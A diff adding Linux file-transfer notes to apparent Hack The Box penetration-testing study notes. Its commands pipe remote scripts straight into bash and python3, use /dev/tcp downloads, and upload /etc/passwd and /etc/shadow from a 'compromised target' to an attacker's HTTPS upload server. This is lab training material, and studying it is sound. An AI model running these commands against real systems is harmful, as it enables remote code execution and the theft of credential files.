@@ -10,6 +10,25 @@
         - [PowerShell Web Uploads](#powershell-web-uploads)
         - [SMB Uploads](#smb-uploads)
         - [FTP Uploads](#ftp-uploads)
+- [Linux File Transfer Methods](#linux-file-transfer-methods)
+    - [Download Operations](#download-operations)
+        - [Base64 Encoding / Decoding](#base64-encoding--decoding)
+        - [Web Downloads with Wget and cURL](#web-downloads-with-wget-and-curl)
+        - [Download with Bash (/dev/tcp)](#download-with-bash-devtcp)
+        - [SCP Downloads](#scp-downloads)
+    - [Upload Operations](#upload-operations)
+        - [Web Upload](#web-upload)
+        - [SCP Upload](#scp-upload)
+
+
+
+
+
+
+
+
+
+
 ## Windows File Transfer Methods
 ### Download Operations
 #### PowerShell Base64 Encode & Decode
@@ -241,3 +260,71 @@ abdeonix@htb[/htb]$ echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4
 > ftp> bye
 > ```
 
+## Linux File Transfer Methods
+### Download Operations
+#### Base64 Encoding / Decoding
+
+- **Steps**
+    1. Check file md5 hash `md5sum file`
+    2. Encode file to base64 `cat file |base64 -w 0;echo`
+    3. Copy this content, paste it onto our Linux target machine, and use base64 with the option `-d` to decode it: `echo -n 'BASE64_VALUE' | base64 -d > file`
+    4. Confirm the md5 hash `md5sum file`
+
+
+> [!NOTE]
+> You can also upload files using the reverse operation. From your compromised target cat and base64 encode a file and decode it in your Pwnbox.
+
+#### Web Downloads with Wget and cURL
+
+- Download using wget: `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
+- Download using curl: `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`
+
+- **Fileless Attacks Using Linux**
+    - Fileless Download with cURL: `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
+    - Fileless Download with wget: `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`
+
+#### Download with Bash (/dev/tcp)
+- As long as Bash version 2.04 or greater is installed (compiled with --enable-net-redirections), the built-in /dev/TCP device file can be used for simple file downloads.
+
+- **Steps**
+    1. Connect to the Target Webserver: `exec 3<>/dev/tcp/10.10.10.32/80`
+    2. HTTP GET request: `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
+    3. Print the Response: `cat <&3`
+
+
+#### SCP Downloads
+- SSH implementation comes with an SCP utility for remote file transfer that, by default, uses the SSH protocol.
+- Downloading files using scp `scp plaintext@OUR_ATTACKING_BOX_IP:/root/myroot.txt . `
+
+
+### Upload Operations
+#### Web Upload
+
+- **Steps**
+    1. Pwnbox:
+        1. Install the uploadserver module. `sudo python3 -m pip install --user uploadserver`
+        2. Create a Self-Signed Certificate `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
+        3. Start Web Server `mkdir https && cd https` `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`
+    2. Target host:
+        1. Upload Multiple Files `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`
+
+> [!NOTE]
+> We used the option `--insecure` because we used a self-signed certificate that we trust.
+
+
+
+- **Alternative Web File Transfer Method**
+    - Since Linux distributions usually have Python or php installed, starting a web server on compromised machine to transfer files is straightforward.
+    - **Steps**
+        1. Creating Web server with different languages
+            - Creating a Web Server with Python3 `python3 -m http.server`
+            - Creating a Web Server with Python2.7 `python2.7 -m SimpleHTTPServer`
+            - Creating a Web Server with PHP `php -S 0.0.0.0:8000`
+            - Creating a Web Server with Ruby `ruby -run -ehttpd . -p8000`
+        2. Download the File from the Target Machine onto the Pwnbox
+            - `wget TARGET_IP:8000/filetotransfer.txt`
+
+
+#### SCP Upload
+
+- `scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/`
